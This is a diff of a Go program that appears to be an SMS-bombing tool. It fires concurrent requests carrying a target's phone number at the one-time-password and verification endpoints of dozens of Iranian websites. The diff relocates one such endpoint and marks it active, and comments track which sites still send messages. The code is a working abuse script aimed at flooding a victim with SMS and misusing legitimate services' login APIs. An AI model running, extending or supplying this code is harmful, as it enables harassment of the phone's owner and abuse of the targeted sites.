@@ -117,9 +117,6 @@ func main() {
 		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
 			"username": phone,
 		}, ch)   // add site
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone,
-		}, ch) 
 		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
 			"msisdn": phone,
 		}, ch)  
@@ -148,6 +145,9 @@ func main() {
 		go sms("https://api.basalam.com/user", map[string]interface{}{
 			s26: phone,
 		}, ch)  // active ✅
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // active ✅
 		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
@@ -321,12 +321,6 @@ func main() {
 		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"phonenumber": phone,
 		}, ch)  
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // add site
-
-
-
 //70 ta site
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
